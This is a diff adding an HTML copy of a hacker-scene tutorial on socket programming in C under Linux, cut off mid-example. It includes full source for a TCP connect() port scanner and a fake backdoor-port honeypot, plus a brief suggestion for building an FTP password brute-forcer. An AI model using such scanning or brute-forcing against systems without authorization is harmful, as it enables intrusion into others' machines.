@@ -1,0 +1,3344 @@
+<html>
+<head>
+<title>Network Programming in C under Linux</title>
+<pre>
+                     __           __           __
+  .-----.--.--.----.|  |.--.--.--|  |.-----.--|  |  .-----.----.-----.
+  |  -__|_   _|  __||  ||  |  |  _  ||  -__|  _  |__|  _  |   _|  _  |
+  |_____|__.__|____||__||_____|_____||_____|_____|__|_____|__| |___  |
+
+   by l0om - member of excluded-team                           |_____|
+
+Networkprogramming in C under Linux
+
+An Introduction
+
+V.1.2
+
+Content
+
+1.0 Preface
+
+2.0 Introduction
+
+3.0 Basic Functions (Client Side)
+
+ 3.1 socket
+
+ 3.2 connect
+
+ 3.3 close
+
+ 3.4 sockaddr_in Structur
+
+ 3.5 Example Program (Portscanner)
+
+4.0 Basic Functions (Server Side)
+
+ 4.1 bind
+
+ 4.2 listen
+
+ 4.3 accept
+
+ 4.4 Example Program (Fakeserver)
+
+5.0 UDP
+
+ 5.1 UDP Clients
+
+ 5.1.1 sendto
+
+ 5.1.2 recvfrom
+
+ 5.1.3 connect with UDP?
+
+ 5.2 UDP Server
+
+ 5.3 UDP Client/Server Example (sysinfs.c sysinfs.c)
+
+6.0 Sophisticated Server
+
+ 6.1 fork
+
+ 6.2 signal
+
+ 6.3 Example Progam (Parallel-Server / Trojan Echoserver).
+
+7.0 Introduction to Raw-Sockets
+
+ 7.1 Header Overview
+
+ 7.1.1 IP Header
+
+ 7.1.2 TCP Header
+
+ 7.1.3 UDPHeader
+
+ 7.1.4 ICMPHeader
+
+ 7.1.5 Pseudo Header
+
+ 7.2 Example Program (TCP-Sniffer)
+
+ 7.3 sendto
+
+ 7.4 Example Program (Pong / Variety of Ping)
+
+ 7.5 select
+
+ 7.6 Improvement (Pong)
+
+ 7.7 Functions for easy/fast Raw-Socket programming
+
+8.0 Summary
+
+9.0 Greets
+
+1.0  Preface
+
+In this tutorial we will deal with networkprogramming under LINUX (/UNIX). During this we
+will only work with the Programminglanguage C. Precognition of C are needed. You should know
+what a describtor or a string is.   # ;)
+
+Furthermore the reader has to be intrested, so when you don´t know one of the listed
+functions (e.g. &quot;read&quot;, &quot;write&quot;) you should check out the according manual ( $ man function).
+Misspellings are due to the state of mind of the author. The text is written in a simple form
+and only contains the main important details of the functions.
+
+A little bit of knowlegde about TCP/IP should be enough to understand the topic, wheras we
+will only deal with IPv4 here. We will emphasise on TCP.
+
+So this Tut is an introduction and topics like threading or multicasting will not be
+discussed.
+
+2.0  Introduction
+
+C is a very flexible language that ranges across a wide area of programming. So terms like
+Kernelprogramming, Systemprogramming and Networkprogramming are well known. The
+networkprogramming deals with the communication between a client and a server . The server
+allocates a service, while the client connects to the server to call on this service. Normaly
+networkable programms are send/shiped out with the operatingsystem. So one knows Web-Browser,
+FTP-Clients or POP-Clients. But we want to write our own server/client applications.
+
+Sockets are a total transparent interface to a remote host. In doing so it does not matter if
+the host is in our LAN or is sited/remaining in a WAN. Through the socket datapackets are
+send from us as far as to a remote host. We just tell the socket what we want and it does the
+rest of the work. A total different things are Raw-Sockets. As the name implies, here the
+transparancy of the networkcommunications are repealed. We as the programmers are now able to
+send our selfmade datapakets, thanks to the Raw-Sockets.
+
+3.0  Basic Functions (Client Side)
+
+Like in all areas of C programming we need functions, with which our work during programming
+is made possible. Like used to the functions reside in headerfiles. To get a short overview
+how big the potentials are, I recommend to take a look at the directory of the &quot;netinet&quot;
+header.
+
+l0om@work:~&gt; cd /usr/include/netinet
+
+l0om@work:/usr/include/netinet&gt; ls
+
+A lot of headers get listed, which all can be used for networkprogramming. We will now take a
+look at the main important functions of networkprogramming.
+
+3.1        socket
+
+Like we know now hosts communicate through sockets. But where do we get them?
+
+Like everything else in a UNIX systems sockets are also describtors. That means that we can
+use them like anyother variable. We can read from it with read() and write to it using
+write(). We will now take a look at the function to create a socket:
+
+Functiondefinition
+
+#include &lt;netinet/socket.h&gt;
+
+int socket(int family, int type, int protocol);
+
+Returnvalue
+
+At success the function returns a socket.
+
+At failure we get -1.
+
+Arguments
+
+.family. states the protocolfamily. Constants are used to give the variable a value.
+
+Constantnname           Definition
+
+AF_INET                  Use of Ipv4
+
+AF_INET6                 Use of Ipv6
+
+AF_LOCAL                 Unix Domain Protocol
+
+AF_ROUTE                 Routing-Sockets
+
+AF_KEY                   Key Sockets
+
+.type. tells the function what kind of socket we do like.
+
+Constantname           Definition
+
+SOCK_STREAM              Stream-socket (TCP)
+
+SOCK_DGRAM               Datagram-socket (UDP)
+
+SOCK_RAW                 Raw-socket (what we like)
+
+.protocol. reamins &quot;0&quot; execpt for Raw-sockets. With Raw-Sockets we can tell, for which kind
+of protocol we want our packets to be created.
+
+Constantname            Definition
+
+IPPROTO_TCP               TCP
+
+IPPROTO_UDP               UDP
+
+IPPROTO_ICMP              ICMP
+
+Example
+
+/* we create a TCP-socket */
+
+int sock;
+
+...
+
+sock = socket(AF_INET, SOCK_STREAM, 0);
+
+.
+
+/* we create a UDP raw socket */
+
+int rawsock;
+
+...
+
+rawsock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+
+If the socket is sucsesfully created, we can use it like anyother integer variable.
+
+3.2        connect
+
+After we created a socket, we are now able to connect to remote services using the connect
+function.
+
+Functiondefinition
+
+#include &lt;sys/socket.h&gt;
+
+int connect(int sockfd, const struct sockaddr *servaddr, socklen_t addrlen);
+
+Returnvalue
+
+At a sucsesfull conenction we get a 0.
+
+At failure we get a -1
+
+Which kinds of failure are there?
+
+If our client doesn´t get a answer to the TCP +SYN packet, errno ETIMEDOUT is returned. The
+length of a timeout of a connection can be changed interactivly in the /proc/sys/ip4/
+directory.
+
+If the answers of the host is a TCP +RST, namely the port is closed a errno ECONNREFUSED is
+returned.
+
+Arguments
+
+.sockfd. has to be an existing socketdescribtor.
+
+.servaddr. has to be a pointer to a sockaddr stuctur. This structur contains data that are
+needed for the connection. Among them the target-port and target-ip adress. We will explore
+this important structur soon.
+
+.addrlen. has to contain the size in bytes of the sockaddr structur.
+
+Example
+
+/* Connection */
+
+...
+
+if(connect(sockfd, (struct sockaddr *)&amp;servaddr, sizeof(struct servaddr)) == -1) {
+
+fprintf(stderr, .cannot connect\n.);
+
+return (-1);
+
+} else printf(.connected\n.);
+
+...
+
+connect gets called within an &quot;if&quot; control structur, to grab the return value of the
+function.
+
+If the return value is -1, an error, a message is printed on the .stderr. stream.
+
+Otherwise a message is printed on .stdout. nonetheless
+
+3.3        close
+
+With .close. we close the open describtor. These are closed at the end of a programm on their
+own, but it shows good style when one closes the describtors. Beside within an active TCP
+connection a normal connection termination is initiated. Furthermore all data that stand in
+line on the socket get send.
+
+Functionsdefinition
+
+#include &lt;unistd.h&gt;
+
+int close(int sockfd);
+
+Arguments
+
+.sockfd. is the open socket.
+
+3.4        sockaddr_in structur
+
+Many functions need a pointer on a .sockaddr. adressstructur. With IPv4 we use .sockaddr_in..
+
+This contains important data concerning the connection setup. So we find here for example the
+portnumber and the ipadress of our target host.
+
+Structurdefinition
+
+#include &lt;netinet/in.h&gt;
+
+struct sockaddr_in {
+
+uint8_t        sin_len;  /* length of structur */
+
+sa_family_t    sin_family /* AF_INET */
+
+in_port_t      sin_port; /* 16-bit TCP/UDP portnumber in
+
+                            .Computerlanguage. */
+
+struct in_addr sin_addr; /* 32-bit Ipv4 addresse in
+
+                            .Computerlanguage. */
+
+char           sin_zero[8]; /* leergut ;) */
+
+}
+
+Structurelement
+
+Refering to POSIX this structur asks for only three elements: sin_family, sin_port, sin_addr.
+These are on every Unix or Unixclone system.
+
+.sin_family. carrys the value of a constant like AF_INET, AF_INET6 or AF_KEY. These constants
+make clear with .what. we communicate. So AF_inet says that we want to use Ipv4.
+
+.sin_port.: Here you state the target-port  . But we can only pass the value on with the
+.htons(VALUE). fcunction . Cause the structurelement requires that the value is passed in
+.computerlanguage.. More in the example.
+
+.sin_addr. is another structur in the sockaddr_in structur. This further structur only holds
+a single element - .s_addr.. .s_addr. is a Ipv4 IP address as 32-bit value. Also for this
+there are a few function with wich we can bring the IP-address into the right format.
+
+Example
+
+/* start */
+
+struct sockaddr_in remotehost;
+
+...
+
+remotehost.sin_family = AF_INET;  /* Ipv4, please */
+
+remotehost.sin_port = htons(80); /* port 80, http(TCP) */
+
+remotehost.sin_addr.s_addr = inet_addr(argv[2]); /* ipadresse should be argument number three
+*/
+
+...
+
+3.5        Example Programm
+
+Here in our practical example we will see, for example the second argument of the programm
+will be transmuted into a 32-bit adress. The function .inet_addr. holds one argument. Namely
+a pointer to a string. This string has to hold the IP-address in normal format.
+
+So- with this knwolegde, together we can stand up to our first challenge. We will write a
+easy (very easy) (TCP)portscanner. The scanner will work with the .vanilla. methode. That
+means, that via connect() we can connect from port to port and by this find out, which
+services are active and which are not.
+
+We will walk through this programm piece by piece.
+
+/* lamescan.c
+
+* another pretty lame connect() scanner...
+
+* usage: lamescan [dest-ip]
+
+*  it only scans from port 1 to 1024 for now. change the values of the
+
+* defined STARTPORT &amp;&amp; ENDPORT if u need to.
+
+*
+
+* l0om
+
+*/
+
+#include &lt;stdio.h&gt;
+
+#include &lt;netinet/in.h&gt;
+
+#include &lt;sys/socket.h&gt;
+
+#define STARTPORT 1         /* beginn scanning here */
+
+#define ENDPORT   1024      /* end scanning here */
+
+#define OPEN      1            /* return 1 for open ports */
+
+#define CLOSED    2            /* and 2 for closed ones */
+
+#define ERROR    -1
+
+int checkprt(int port, char *ip);
+
+The needed headerfiles are included. Namely stdio.h for the standard functions, socket.h for
+functions like .socket. and netinet/in.h to use with connect and our structur sockaddr_in.
+
+Next we define our next constants. The constants STARTPORT and ENDPORT define from where to
+where will be scanned and we can change them on demand. ERROR, OPEN and CLOSED are
+returnvalues we will work with, to see if our port are open or not .
+
+We create a functionprototyp. This function will be used for connecting us with a port.
+.port. gives the portnumber and .IP. has the IP in clear text.
+
+int checkprt(int port, char *ip)
+
+{
+
+  int test = 0;
+
+  int sockfd;
+
+  struct sockaddr_in servaddr;
+
+  sockfd = socket(AF_INET, SOCK_STREAM, 0);
+
+    if(sockfd &lt; 0) {
+
+      printf(&quot;error. cannot creat socket\n&quot;);
+
+      return ERROR;
+
+    }
+
+  servaddr.sin_family = AF_INET;
+
+  servaddr.sin_addr.s_addr = inet_addr(ip);
+
+  servaddr.sin_port = htons(port);
+
+  test = connect(sockfd, (struct sockaddr_in *)&amp;servaddr, sizeof(servaddr));
+
+  if(test == -1){
+
+    close(sockfd);
+
+    return CLOSED;
+
+  }
+
+  close(sockfd);
+
+  return OPEN;
+
+}
+
+And here comes the functionbody allready. A socket is created and tested if it was created
+sucsessfull. After that we initialise our structur.
+
+We use the .ip. Argument as an argument for .inet_addr. and the .port. argument as an
+argument for .htons.. We have our arguments changed into &quot;Computerlanguage&quot; through these two
+function.
+
+Now we call connect and save the return value in the integer variable &quot;test&quot;. The return
+value of &quot;test&quot; is checked on -1. Is Test negativ (-1) CLOSE is returned, else OPEN. Now for
+the main function.
+
+int main(int argc, char **argv)
+
+{
+
+  int i;
+
+  char *dest;
+
+  if(argc != 2) {
+
+    printf(&quot;usage: %s [dest-ip]\n&quot;,argv[0]);
+
+    return ERROR;
+
+  }
+
+  dest = argv[1];
+
+  printf(&quot;\n\tlamescan    a REAL lame portscanner\n&quot;);
+
+  printf(&quot;\t-----------------------------------\n&quot;);
+
+  printf(&quot;\tl0om\n\n&quot;);
+
+  printf(&quot;scanning from %d to %d -&gt; %s\n\n&quot;,STARTPORT, ENDPORT, argv[1]);
+
+  for(i = STARTPORT; i &lt;= ENDPORT; i++)
+
+    if(checkprt(i,dest) == OPEN)
+
+      printf(&quot;port %d is open\n&quot;,i);
+
+  printf(&quot;scan finished\n&quot;);
+
+  return 0;
+
+}
+
+We check if the programm is called correctly. Just one argument. Then we point the pointer
+.dest. on the beginning of the arguments. We initialise the varible .i. with the value of the
+constant STARTPORT and increment .i. till the value of ENDPORT is reached. The value of .i.
+is set during each looprun as the .port. argument of .checkprt. and the returnvalue of the
+function is checked each time. On OPEN the user is notfied, otherwise not.
+
+Now an easy one:
+
+root:~ # gcc -o lamescan lamescan.c
+
+root:~ # ./lamescan 127.0.0.1    # we scan the fbi  ;)
+
+and the open TCP ports of the hosts are shown to us.
+
+With our so far gained knowlegde we can even write a brutforce program. Just connect with the
+service and transfer the right string with .write(). (z.B. FTP: USER blah\r\n &amp;&amp; PASS
+blahblah\r\n). Than via .read(). get the output of the server and recognize this way if the
+password is right or not. But I do not want to take all the work off of you.
+
+4.0 Basic Functions (Server Side)
+
+As a server we have the job to listen on a port for a connection. If a client wants to
+establish a connection, we make it possible. Depending on the server application we serve a
+service to the client. To have everything working we naturely need new functions. Whereby we
+also need to use the previous named.
+
+4.1 bind
+
+With the &quot;bind&quot; function we knot protocoll specific data, like the portadress and the IP-
+adress wich is alowed to make a connection.
+
+Functiondefinition
+
+#include &lt;sys/socket.h&gt;
+
+int bind(int sockfd, const struct sockaddr *myaddr, socklen_t addrlen);
+
+Returnvalue
+
+0 if Okay, -1 if error.
+
+Arguments
+
+&quot;sockfd&quot; is the &quot;knoted&quot; socket, on which we will listen for connections later.
+
+&quot;myaddr&quot; stands for a completly filled &quot;sockaddr_in&quot; structur. In this on one hand the
+protocolfamily is defined, on the other hand the portadress and the IP-adress of the local
+interface which is allowed to make a connection. Cause this would limit our server to
+connections with the same host, we use wildcard, with which every client is able, to connect
+to the server. For this we asign the value of the variable &quot;s_addr&quot; like following:
+
+servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
+
+&quot;socklen_t&quot; is the length of the structur in bytes.
+
+Example:
+
+/* start */
+
+struct sockaddr_in myaddr;
+
+...
+
+myaddr.sin_family = AF_INET;
+
+myaddr.sin_port = htons(6736);
+
+myaddr.sin_addr.s_addr = htonl(INADDR_ANY);
+
+...
+
+if(bind(sockfd,(struct sockaddr *)&amp;myaddr, sizeof(struct sockaddr)) == -1) {
+
+fprintf(stderr,&quot;cannot bind\n&quot;);
+
+return (-1);
+
+}
+
+...
+
+Here a structur for the protocolfamlily IPv4 is filled. On one hand we define that the socket
+sockfd listens on port 6736 and on the other hand that really everyone can connect with it.
+Beside blocking IP Adresses with the help of /etc/hosts.deny, but thats another stroy.
+
+4.2 listen
+
+Using the &quot;listen&quot; function we tell the socket to start listen. The socket enters passive
+mode and waits for incomming connections. But we can not accept the connection with this,
+&quot;accept&quot; takes care of this.
+
+Functiondefinition
+
+#include &lt;syss/socket.h&gt;
+
+int listen(int sockfd, int backlog);
+
+Returnvalue
+
+0 if Okay, -1 if failure .
+
+Arguments
+
+&quot;sockfd&quot; has(!) to be a socket, that was created succesfully and to which already using
+&quot;bind&quot; the nedded protocollinformations are linked. So this socket will be used to listen for
+connections.
+
+&quot;backlog&quot; is a whole number which tells the kernel how many connections he should put into
+the waiting que. By doing so we consider that the kernel runs two waiting ques. One with
+incomplete connections (a SYN came and we are waiting for a second SYN) and already complete
+connections.
+
+#########NOTE#########
+
+Within here lies the danger of SYN-flooding. A mass of SYN packets arrives at the port. It
+puts each SYN as a incomplete connections into &quot;backlog&quot;. This sooner or later has the cause
+that the threshold of &quot;backlog&quot; is reached and no new connections are accepted. Today there
+are countermeasures like SYN-cookies. These are handeled internaly by the kernel
+
+?fehlt was?
+
+#######################
+
+Example
+
+/* start */
+
+...
+
+listen(sockfd, 12);
+
+...
+
+We listen on the socket &quot;sockfd&quot; and put a maximum of 12 connections into the waitingques.
+
+4.3 accept
+
+Using .accept. we have the option to return the next complete connection from the waitingque.
+If there is no complete connection to return, the function blocks until it finds a complete
+connection in the waitingque. Like we know the waitingque ist controlled by the &quot;listen&quot;
+funktion. The listening socket remains and takes care of the waitingque. Cause we get from
+the function a new socket, which represents the connected client.
+
+Functiondefinition
+
+#include &lt;sys/socket.h&gt;
+
+int accept(int sockfd, struct sockaddr *cliaddr, socklen_t addrlen);
+
+Returnvalue
+
+On success the function returns a brand new connected socket. This new describtor points to
+the TCP connection with the client.
+
+On failure we get a -1.
+
+Argumente
+
+.sockfd. is the &quot;listen-describtor&quot;. Its the socket, which is used by listen, to listen for
+oncoming connections.
+
+ .cliaddr. is the protocoladress of the connected clients. We so get his IP-adress and
+ further data. If we are not intrested into the clients identity, we just set &quot;cliaddr&quot; and
+ &quot;addrlen&quot; to the constant NULL.
+
+.addrlen. is the size of .cliaddr. in bytes.
+
+Example
+
+/* start */
+
+int sockfd, connfd;
+
+.
+
+bind(sockfd, (struct sockaddr *)&amp;servaddr, sizeof(servaddr));
+
+listen(sockfd, 4);
+
+.
+
+while(1) {
+
+connfd = accept(sockfd, (struct sockaddr *)&amp;client, sizeof(client));
+
+do_something_with_client(&amp;connfd);
+
+close(connfd);
+
+}
+
+Here we see that two socket-descriptor are declared. Its &quot;sockfd&quot; and &quot;connfd&quot;. The functions
+like &quot;bind&quot; and &quot;listen&quot; are run on the socket &quot;sockfd&quot;. Now we call an endless loop. If
+&quot;acept&quot; gets a complet connection, it passes the new describtor over to &quot;connfd&quot;. Now the
+service is made availabe for the client and afterwards the connections is closed using
+&quot;closed&quot;.
+
+4.4 Exampleprogram
+
+Again lets have a look at the principals of a server-application a little bit depper.
+
+           socket()
+
+              |
+
+              |
+
+              |
+
+            bind()
+
+              |
+
+              |
+
+              |
+
+           listen()
+
+              |
+
+              | &lt;---------|
+
+              |           |
+
+            accept()      |
+
+              |           |
+
+              |           |
+
+            dienst()      |
+
+              |           |
+
+              |           |
+
+            close()--------
+
+Using &quot;socket&quot; we first create a socket (TCP/UDP). Next we connect using &quot;bind&quot; the
+protocollinformation onto the created socket. The &quot;listen&quot; functions listens for oncomming
+connections. With &quot;accept&quot; we acceppt the incomming connection and offer our service to the
+client. At the end of usage of the service, we close the socket and with that also the
+connection using &quot;close&quot;. But naturely a server should be reachable further more, so with
+help of the loop we return, before &quot;accept&quot;
+
+We gonna write an example server. Actually we will tinker us a fakeserver for our &quot;Trojaner
+h4X0rZ. We will offer our service under a standard Backdoor-Port. The user can determine the
+port on which is to listen with help of the &quot;-p&quot; function. The connections are writen into a
+LOGFILE (ip-adresse and date). On behalf the user can call the &quot;-a&quot; function, which gives of
+a &quot;bell&quot; tone when a 1337 h4X0r connects. Our connected experts surely get a blast which we
+define in the constant MASSAGE :).
+
+/* fakeserver.c
+
+a fakeserver for the trojan l337 I_4m3rZ.
+
+all connected h4x0rZ see the #defined MASSAGE - change it if u want.
+
+all connections get logged to the #defined LOGFILE - change if u want.
+
+l0om
+
+*/
+
+#include &lt;stdio.h&gt;
+
+#include &lt;netinet/in.h&gt;
+
+#include &lt;sys/socket.h&gt;
+
+#include &lt;time.h&gt;
+
+#define LOGFILE  &quot;/root/fakeserver.log&quot;   /* all connections are logged here*/
+
+#define MASSAGE &quot;hey u l337 h4x0r-&gt; u got blamed by a fakeserver, so FUCK OFF (now plz)&quot;  /*
+the message */
+
+void help();
+
+Like before we include some headerfiles. &quot;time.h&quot; is used to get the date of the connection.
+
+The named constant are defined like LOGFILE and MASSAGE.
+
+We just need one &quot;help&quot; function for a retard user to explain the usage.
+
+int main(int argc, char **argv)
+
+{
+
+  int i;
+
+  ssize_t len;
+
+  int alert = 0;
+
+  int sockfd, connfd;
+
+  int port = 6667;
+
+  struct sockaddr_in servaddr, cliaddr;
+
+  time_t istime;
+
+  FILE *logfd;
+
+  if( (getuid()|getgid()) != 0) {
+
+    printf(&quot;sorry-&gt; u must be root&quot;);
+
+    return -1;
+
+  }
+
+  if(argc &gt; 1) {
+
+    for(i = 0; i &lt; argc; i++) {
+
+      if(strncmp(argv[i], &quot;-p&quot;, 2) == 0)
+
+            port = atoi(argv[++i]);
+
+      if(strncmp(argv[i], &quot;-h&quot;, 2) == 0) {
+
+            help();
+
+            return 0;
+
+      }
+
+      if(strncmp(argv[i], &quot;-a&quot;,2) == 0)
+
+            alert = 1;
+
+    }
+
+  }
+
+We declare some Variables and structurs nedded for the further programmrun. We check if the
+user is root. With &quot;i&quot; we work through the passed arguments. &quot;alert&quot; is set to 1, if the &quot;-a&quot;
+option is choosen. Furthermore two sockets are created. &quot;port&quot; carries a standard value which
+can be changed with help of the &quot;-p&quot; function. We declare two &quot;sockaddr_in&quot; structurs. One
+for the server and one for our connected expert. &quot;time_t&quot; is a unsigned number which is used
+to get the time and date. &quot;logfd&quot; is a filedescribtor through which we write into the
+LOGFILE.
+
+  memset(&amp;servaddr, '\0', sizeof(servaddr));
+
+  servaddr.sin_family = AF_INET;
+
+  servaddr.sin_port = htons(port);
+
+  servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
+
+  sockfd = socket(AF_INET, SOCK_STREAM, 0);
+
+  if(sockfd &lt; 0) {
+
+    printf(&quot;cannot create socket\n&quot;);
+
+    return -1;
+
+  }
+
+  bind(sockfd, (struct sockaddr *)&amp;servaddr, sizeof(servaddr));
+
+  listen(sockfd, 6);
+
+  len = sizeof(cliaddr);
+
+  while(1&gt;0) {
+
+    connfd = accept(sockfd, (struct sockaddr *)&amp;cliaddr,&amp;len);
+
+    if(alert)
+
+      printf(&quot;\a&quot;);
+
+    logfd = fopen(LOGFILE, &quot;a&quot;);
+
+      if(logfd &lt; 0) {
+
+      printf(&quot;cannot write to logfile\n&quot;);
+
+      logfd = stdout;
+
+      }
+
+    write(connfd, MASSAGE, strlen(MASSAGE));
+
+    istime = time(NULL);
+
+    fprintf(logfd, &quot;%s connected at %s\n&quot;,inet_ntoa(cliaddr.sin_addr.s_addr),
+
+                ctime(&amp;istime));
+
+    fclose(logfd);
+
+    close(connfd);
+
+  }
+
+  return 0;
+
+}
+
+We pass the importent values for the server over to the &quot;servaddr&quot; structur. After that we
+create us a socket. To which we connect like before with &quot;bind&quot; the protocolinformations. We
+call &quot;listen&quot;, to wait for incoming connections. During the endlesslopp we call &quot;accept&quot;,
+which blocks at first. When a connection comes in either a &quot;bell&quot; tone is heard or not.
+During further we open our LOGFILE. Now our expert is served a delicious message and all data
+is writen into the LOGFILE. After this we disconnect the connection and close the file. For
+further information on &quot;time()&quot;:
+
+$ man time
+
+void help()
+
+{
+
+  puts(&quot;fakeserver.c\n&quot;);
+
+  puts(&quot;usage&quot;);
+
+  puts(&quot;./fakeserver -p 6969&quot;);
+
+  puts(&quot;-p : the following argument must be the port to fake&quot;);
+
+  puts(&quot;-h : prints this help message&quot;);
+
+  puts(&quot;-a : allways rings when some h4xor connected&quot;);
+
+  puts(&quot;for change logfile or the message see the source\n&quot;);
+
+  puts(&quot;l0om&quot;);
+
+}
+
+The help menue.
+
+Alright get going.
+
+root:~ # gcc -o fakeserver fakeserver.c
+
+root:~ # ./fakeserver -p 6969 -a &amp;
+
+WE run the programm in the background. Now a test...
+
+root:~ # telnet 127.0.0.1 6969
+
+Trying to Connect 127.0.0.1.
+
+Connected with 127.0.0.1.
+
+Escape Character is .^[.
+
+ hey u l337 h4x0r-&gt; u got blamed by a fakeserver, so FUCK OFF (now plz) Connection closed by
+ foreign Host.
+
+root:~ # cat /root/fakeserver.log
+
+127.0.0.1 connected at   #datum  :)
+
+5.0 UDP
+
+Until now we only worked with TCP applications. But there is a alternative to TCP. The UDP
+(User Datagram Protokoll) is in contrary to TCP stateless. In clear word this means, there is
+no connection like with TCP, beside a connectionrequest. Further more UDP is truly spoken a
+unsave protocl. What means, that with UDP you do not get any informations about if your
+datagram reached its destination or not. However there are applications that rather use UDP
+instead of TCP. SNMP. TFTP and NFS are just three famous examples. Cause UDP does not care
+about much, it is also regarding speed better than TCP. But also more unsave (heres where the
+cat bits its tail). Not to forget - UDP is BROADCAST able. What says, that a client can
+communicate with a whole subnet. TCP doe not hold this ability.
+
+How can we as the programmer now write networkapplications with UDP.
+
+5.1 UDP Clients
+
+The principals of the UDP client are naturaly similar to the TCP client. But cause of the
+diffrences of UDP and TCP other functins are needed. Lets take a look at a client from the
+birds perspective:
+
+ socket()
+
+  |
+
+  |
+
+ sendto()     /* sending of data */
+
+  |
+
+  |
+
+ recvfrom()   /* reading the answer*/
+
+  |
+
+ close()
+
+For this run we only need two function, which we examine closer now.
+
+5.1.1 sendto
+
+Functionsdefinition
+
+#include &lt;sys/socket.h&gt;
+
+ssize_t sendto(int sockfd, void *buf, size_t nbytes, int flags,
+
+                 struct sockaddr *to, size_t addrlen);
+
+Returnvalue
+
+.sendto. either return -1 on failure, or the number of bytes that were send by the UDP
+socket.
+
+Arguments
+
+.sockfd. is like we already think a created UDP socket.
+
+.buf. contains the data that are to be transfered. Cause it is a void-datatyp, we can
+transfer any kind of datatyps.
+
+.nbytes. is the size of .buf. in bytes.
+
+About the .flags. option we talk another time. We just have the flags remain 0.
+
+In the sockaddr structur, like always the protocol specific data, which are needed for the
+datatransfer are located. Which means cleary: targetport, targetadress and family (see tcp-
+it is the same structure).
+
+Into the .addrlen. the number of byte of the structur sockadres is left behind.
+
+5.1.2
+
+Functiondefinition
+
+ssize_t recvfrom(int sockfd, void *buf, size_t nbytes, int flags, const
+
+                  struct sockaddr *to, size_t *addrlen);
+
+Returnvaluee
+
+.recvfrom. returns -1 on failure or the number of read bytes. Whereby a returnvalue of 0 is
+not a an error. A Value of 0 means, that we received a UDP packet, but which does not contain
+any datacontent (ipheader+upheader).
+
+Another important thing is that the last argument is a pointer. So we can pass
+&quot;sizeof(servaddr)&quot; as an argument, but instead pass the value onto a variable and pass the
+memoryadress with the dydisch register operator (&amp;).
+
+Argument
+
+The most arguments are the same like with &quot;sendto&quot;. What has changed is the &quot;to&quot; argumnet. If
+we do not fill the argument with the literal NULL, but instead with a valid structur, revfrom
+writes the data of the sender into the structur. Through this we can check the sender (and if
+the UDP packet was not send by someone else).
+
+5.1.3 Connect (connecting) with UDP?
+
+Is it possible to start a connect() call with a UDP client?
+
+Yes, it is. But using connect() with UDP there is in contrary to TCP no three-way-handshake,
+instead the kernel puts the data which we pass over in the structur sockaddr with connect(),
+into his logs and returns. So there is no connection, and we cant port port lamescan.c as
+easy, so that we can also scan UDP ports. What is imagble is a sendto to each Port and a
+recfrom. If it reads an answer the port is open (answer received) elsewise closed. Please
+consider that recfrom is blocking function and one has build in functions like select (else
+the programm hangs on no server response). We will write an even easier exampleprogramm.
+
+What kind of advantages brings the call of connect considering UDP?
+
+So when we call connect() we are able to transfer the data with functions like write() or
+send(). Beside we can also read with functions like read() and recv().
+
+5.2 UDP Server
+
+We take a little sideway over to the servers. The servers work with the same functions like
+the clients and the TCP servers.
+
+socket()
+
+  |
+
+  |
+
+bind()
+
+  | &lt;--------|
+
+recvfrom()   |
+
+  |          |
+
+sendto()     |
+
+  |          |
+
+close()------|
+
+With a UDP Server you can neglect listen(). However we have to bind the protocol specifice
+data with bind() (see tcp).
+
+  For sure the server first waits for the receival of packets (recvfrom) and afterwards
+  starts the reduction. What meets the eye is that we neither need listen() nor accept(). We
+  just wait till someone sends us something that is related to UDP.
+
+5.3 UDP Server/Client example (sysinfs.c sysinfc.c)
+
+During this example we will write a UDP server which sends the client information about the
+kernel.
+
+Like used to we will make some think steps, so the programm is understood. First the server .
+sysinfs.c.
+
+#include &lt;stdio.h&gt;
+
+#include &lt;sys/socket.h&gt;
+
+#include &lt;netinet/in.h&gt;
+
+#define   SERV_PORT    6996             /* port to &quot;listen&quot; */
+
+#define   SYSINFO      &quot;/proc/version&quot;  /* get sysinfos */
+
+Here like used to first the needed headers are linked. We define SERV_PORT as the default
+port for our application.
+
+From the file SYSINFO we read the data that we will send to the client.
+
+int main(void)
+
+{
+
+  int sockfd, nbytes;
+
+  char sysinfos[60] = { 0 };
+
+  char message[20] = { 0 };
+
+  size_t len;
+
+  struct sockaddr_in servaddr, cliaddr;
+
+  FILE *fd;
+
+  sockfd = socket(AF_INET, SOCK_DGRAM, 0);
+
+  if(sockfd &lt; 0) {
+
+    fprintf(stderr, &quot;error, cannot creat socket\n&quot;);
+
+    return(-1);
+
+  }
+
+  fd = fopen(SYSINFO, &quot;r&quot;);
+
+  if(fd == NULL) {
+
+    fprintf(stderr, &quot;error, cannot open sys file\n&quot;);
+
+    return(-1);
+
+  }
+
+  fgets(sysinfos, sizeof(sysinfos), fd);
+
+  servaddr.sin_family = AF_INET;
+
+  servaddr.sin_port = htons(SERV_PORT);
+
+  servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
+
+  bind(sockfd, (struct sockaddr *)&amp;servaddr, sizeof(servaddr));
+
+Here we are already in the main() function. First we declare some variables ( i think i don´t
+need to say anything about). We initialiase .sockfd. as a UDP socket (SOCK_DGRAM).
+
+Via fopen() we open the infofile for reading and read via fget the data of the file into the
+&quot;sysinfos&quot; puffer.
+
+Now we put down the protocolinformation. Same as with the TCP Server, the port and the
+allowed incomes (INADDR_ANY = everyone is allowed to connect).
+
+We bind these data with bind() to the socket.
+
+  while(1) {
+
+    len = sizeof(cliaddr);
+
+    nbytes = recvfrom(sockfd, message, sizeof(message), 0,
+
+                              &amp;cliaddr, &amp;len);
+
+    if(nbytes &lt; 0) {
+
+      fprintf(stderr, &quot;recvfrom error\n&quot;);
+
+      return(-1);
+
+    }
+
+    nbytes = sendto(sockfd, sysinfos, sizeof(sysinfos), 0,
+
+                            (struct sockaddr *)&amp;cliaddr, sizeof(cliaddr));
+
+    if(nbytes &lt; 0) {
+
+      fprintf(stderr, &quot;sendto error\n&quot;);
+
+      return(-1);
+
+    }
+
+  }
+
+  return(0);
+
+}
+
+Within the endless loop, we wait for incoming data. When we receive some, we initialise the
+structur &quot;cliaddr&quot; with the value of the sender and send the information to the sender.
+
+That´s the server.
+
+Now for the client (sysinfc.c).
+
+#include &lt;stdio.h&gt;
+
+#include &lt;sys/socket.h&gt;
+
+#include &lt;netinet/in.h&gt;
+
+#define  SERV_PORT  6996
+
+#define  MESS       &quot;gimmi infos&quot;
+
+int main(int argc, char **argv)
+
+{
+
+  int sockfd, nbytes;
+
+  size_t len;
+
+  char received[60] = { 0 };
+
